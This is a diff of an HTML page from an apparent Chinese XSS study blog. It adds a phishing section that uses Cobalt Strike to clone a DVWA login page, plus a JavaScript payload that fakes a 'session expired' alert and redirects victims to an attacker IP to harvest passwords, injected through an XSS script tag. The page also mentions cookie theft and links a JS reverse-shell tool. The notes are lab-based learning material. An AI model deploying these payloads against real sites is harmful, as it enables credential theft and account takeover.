@@ -33,10 +33,12 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208000108029.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111155822.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111904181.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231209160210299.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231209165153379.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png">
 <meta property="article:published_time" content="2023-12-01T12:22:37.000Z">
-<meta property="article:modified_time" content="2023-12-08T03:23:59.754Z">
+<meta property="article:modified_time" content="2023-12-09T09:00:31.968Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="基础漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -240,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.1k words
+          6.1k words
         
       </span>
     
@@ -251,7 +253,7 @@
         
         
         
-          43 mins
+          51 mins
         
       </span>
     
@@ -360,6 +362,34 @@
 <p>本机上面测试的，下面是使用服务器，获取使用者的cookie</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208111904181.png" srcset="/img/loading.gif" lazyload alt="image-20231208111904181"></p>
 <p>也是成功获取，这个主要的方式是，启动一个我们伪造的网页或者web服务，使用他的cookie作为参数，传给我们，然后我们使用它的cookie就可以登录他的账号了</p>
+<p>我们也可以搭建自己xss平台</p>
+<p>但是上面的方法始终不会很隐蔽</p>
+<h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>就是诱骗你去点链接</p>
+<h2 id="Flash-钓鱼"><a href="#Flash-钓鱼" class="headerlink" title="Flash 钓鱼"></a>Flash 钓鱼</h2><p>就是除了网站url，但是其他的都相同</p>
+<h2 id="cobalt-strike钓鱼"><a href="#cobalt-strike钓鱼" class="headerlink" title="cobalt strike钓鱼"></a>cobalt strike钓鱼</h2><h3 id="CS简介"><a href="#CS简介" class="headerlink" title="CS简介"></a>CS简介</h3><p>这个是常用的团队渗透作战工具，可以实现横向移动，数据窃取，鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端</p>
+<h3 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h3><p>可以跟着下面的步骤 进行就可以了，我将虚拟机作为服务器win10</p>
+<p>启动cs的克隆网站模式，这里我们克隆dvwa的登录界面，诱使用户点击</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231209160210299.png" srcset="/img/loading.gif" lazyload alt="image-20231209160210299"></p>
+<p>注意这里不能使用云服务器克隆，因为虚拟机时内网机器，不能被访问到</p>
+<p>我们使用kali克隆</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231209165153379.png" srcset="/img/loading.gif" lazyload alt="image-20231209165153379"></p>
+<p>可以成功</p>
+<p>然后我们的思路时，当一个用户方访问正常的页面的时候，跳转到了我们的网站，然后他登录这个网站，我们就可以使用CS的输出信息看他的密码了</p>
+<p>下面时使用的payload，将下面的js放入一个sj文件之后，使用连接访问</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>)&#123; <span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;IFRAME&quot;</span>); iframe.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;none&quot;</span>; iframe.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&#x27;date:text/plain&#x27;</span>); <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-title function_">appendChild</span>(iframe); <span class="hljs-variable language_">window</span>.<span class="hljs-property">frames</span> [<span class="hljs-number">0</span>].<span class="hljs-property">window</span>.<span class="hljs-title function_">alert</span>(name); iframe.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(iframe); &#125; <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;登陆过期，请重新登陆！&quot;</span>); <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://192.168.220.129/&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>再有xss的地方插入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;js文件的地址&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="Beef钓鱼"><a href="#Beef钓鱼" class="headerlink" title="Beef钓鱼"></a>Beef钓鱼</h2><h1 id="流量挟持"><a href="#流量挟持" class="headerlink" title="流量挟持"></a>流量挟持</h1><p>可以理解为，增加自己服务器的浏览量，出入到别人的网站里面</p>
 <h1 id="反射型XSS攻击流程"><a href="#反射型XSS攻击流程" class="headerlink" title="反射型XSS攻击流程"></a>反射型XSS攻击流程</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png" srcset="/img/loading.gif" lazyload alt="image-20231203204136766"></p>
 <p><strong>反射型XSS：</strong>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），<strong>一般容易出现在搜索页面</strong>。反射型XSS大多数是用来盗取用户的Cookie信息</p>
 <p>总结一下：</p>
@@ -465,7 +495,12 @@
 <h1 id="使用JS反向shell"><a href="#使用JS反向shell" class="headerlink" title="使用JS反向shell"></a>使用JS反向shell</h1><blockquote>
 <p>git clone <a target="_blank" rel="noopener" href="https://github.com/shelld3v/JSshell.git">https://github.com/shelld3v/JSshell.git</a></p>
 </blockquote>
-<h1 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h1><p>[^html编码]: HTML编码是一种将特殊字符转换为HTML实体的过程。在HTML中，有一些特殊字符具有特殊的含义，比如小于号（&lt;）、大于号（&gt;）、引号（”）、和符号（&amp;）等。如果直接在HTML中使用这些字符，有时会导致解析错误或显示不正常。因此，需要使用HTML编码将这些特殊字符转换为对应的实体或代码。将小于号（&lt;）编码为 <code>&amp;lt</code>，将大于号（&gt;）编码为 <code>&amp;gt</code>，将引号（”）编码为 <code>&amp;quot</code>，将和符号（&amp;）编码为 <code>&amp;amp</code> 等。</p>
+<h1 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h1><p>注意如果是挖掘src的话，不要使用弹窗！！</p>
+<p>可以使用下面的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个需要在F12，开启调试之后才能发现，可以理解为调试的结果，日志输出</p>
+<p>[^html编码]: HTML编码是一种将特殊字符转换为HTML实体的过程。在HTML中，有一些特殊字符具有特殊的含义，比如小于号（&lt;）、大于号（&gt;）、引号（”）、和符号（&amp;）等。如果直接在HTML中使用这些字符，有时会导致解析错误或显示不正常。因此，需要使用HTML编码将这些特殊字符转换为对应的实体或代码。将小于号（&lt;）编码为 <code>&amp;lt</code>，将大于号（&gt;）编码为 <code>&amp;gt</code>，将引号（”）编码为 <code>&amp;quot</code>，将和符号（&amp;）编码为 <code>&amp;amp</code> 等。</p>
 
                 
               </div>
